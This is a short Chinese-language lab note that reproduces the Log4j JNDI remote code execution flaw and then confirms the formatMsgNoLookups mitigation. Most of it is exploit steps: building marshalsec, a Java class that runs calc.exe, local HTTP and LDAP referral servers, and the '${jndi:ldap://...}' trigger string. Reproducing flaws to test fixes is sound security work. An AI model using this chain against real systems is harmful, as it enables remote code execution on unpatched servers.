



### 参考

https://www.sohu.com/a/507149733_120743310

### 漏洞复现步骤

#### 1、编译marshalsec

marshalsec下载地址：https://github.com/mbechler/marshalsec.git

maven编译marshalsec成jar包

```java
mvn clean package -DskipTests
```

#### 2、准备漏洞文件

robots.java

```java
import java.lang.Runtime;
import java.lang.Process;

public class robots{
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"calc.exe"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

javac编译成robots.class文件

```java
javac robots.java
```

#### 3、 搭建环境

- 搭建http服务器

  > python -m http.server 80		# 需要python3版本，且robots.class文件必须放在当前目录下

![image-20211211140545438](C:\Users\Zoser\AppData\Roaming\Typora\typora-user-images\image-20211211140545438.png)



- 搭建ldap服务器

借助marshalsec启动一个LDAP服务器，监听9999端口

> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1/#robots" 9999

![image-20211211145143288](C:\Users\Zoser\AppData\Roaming\Typora\typora-user-images\image-20211211145143288.png)

#### 4、log4j漏洞复现

随便写一个测试接口，输出如下日志

```java
log.info("${jndi:ldap://localhost:9999/robots}");
```

访问接口会触发漏洞

![image-20211211141616935](C:\Users\Zoser\AppData\Roaming\Typora\typora-user-images\image-20211211141616935.png)

#### 5、临时解决方案验证

已验证。在添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true后可以解决此问题



